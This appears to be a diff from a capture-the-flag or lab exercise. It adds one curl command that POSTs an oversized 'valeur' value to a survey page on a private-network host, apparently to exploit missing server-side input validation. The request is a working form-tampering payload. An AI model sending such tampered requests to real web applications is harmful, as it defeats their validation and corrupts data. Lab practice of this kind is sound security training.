@@ -1,0 +1,2 @@
+curl -X POST http://192.168.56.110/?page=survey -H "Content-Type: application/x-www-form-urlencoded" -d "sujet=1&valeur=9999999999999"
+
